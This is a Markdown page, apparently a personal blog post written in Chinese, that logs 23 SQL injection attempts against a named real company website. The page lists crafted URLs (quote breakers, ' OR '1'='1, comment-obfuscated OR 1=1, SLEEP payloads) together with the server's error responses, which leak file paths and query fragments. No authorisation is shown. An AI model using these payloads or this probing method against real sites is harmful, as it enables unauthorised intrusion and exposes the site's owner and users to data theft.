---
title: SQL Injection ls-design Success
description: SQL Injection ls-design Success
---

## 測試過程

1. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

2. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html')`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

3. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'))`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '))' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

4. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html%`

```
403 No Response Body
```

看起來無法注入 `%`

5. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'%20OR%20'1'%20=%20'1` (`' OR '1' = '1`)

```
Forbidden
You don't have permission to access this resource.

Additionally, a 403 Forbidden error was encountered while trying to use an ErrorDocument to handle the request.
```

看起來無法注入 `%20`

6. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'%25)` (`'%`)

<!-- ```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
``` -->

同 1.

7. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html%25%25`

```html
<script>
  location.href = "/news.html";
</script>
```

8. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'/**/OR/**/1=1--/**/123`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

9. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html')'`

```
Connection timed out Error code 522 (Cloudfare)
```

10. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html')'test'`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')'test'' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

11. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html')'test`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ')'test' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

12. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html/**/`

頁面載入成功，但 CSS 跟 JS 載入失敗，所以畫面很醜

13. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html%2F**%2F`

```
Not Found
The requested URL was not found on this server.

Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.
```

14. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html**/`

<!-- ```html
<script>location.href='/news.html';</script>
``` -->

同 7.

15. https://www.ls-design.com.tw/news_detail_2025_zeroclick.html'/**/OR/**/SLEEP(2)--/**/123

<!-- ```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
``` -->

同 8.，並且沒有延遲 5 秒，推測 `SLEEP(5)` 沒有執行成功

16. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html))`

<!-- ```html
<script>location.href='/news.html';</script>
``` -->

同 7.

17. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html''`

<!-- ```html
<script>location.href='/news.html';</script>
``` -->

同 7.

18. `https://www.ls-design.com.tw/123.html`

<!-- ```
Not Found
The requested URL was not found on this server.

Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.
``` -->

同 13.

19. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.html',1)/**/OR/**/SLEEP(5)--/**/123`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1)/**/OR/**/SLEEP(5)--/**/123' AND meta_set = '1' AND meta_type = '1' AND met...' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

20. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.htmltest','test'`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''test'' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

21. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.htmltest',test`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

22. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.htmltest',test))`

```
Fatal error: Uncaught exception 'PDOException' with message 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test))' AND meta_set = '1' AND meta_type = '1' AND meta_memo != ''' at line 1' in /home/lsdesign/public_html/includes/cls_mysql.php:44 Stack trace: #0 /home/lsdesign/public_html/includes/cls_mysql.php(44): PDOStatement->execute() #1 /home/lsdesign/public_html/includes/lib_main.php(33): DB->GetRow('SELECT * FROM m...') #2 /home/lsdesign/public_html/includes/init.php(55): getMetaHotsite('meta_memo') #3 /home/lsdesign/public_html/news_detail.php(8): require_once('/home/lsdesign/...') #4 {main} thrown in /home/lsdesign/public_html/includes/cls_mysql.php on line 44
```

23. `https://www.ls-design.com.tw/news_detail_2025_zeroclick.htmltest'test))`

同 22.
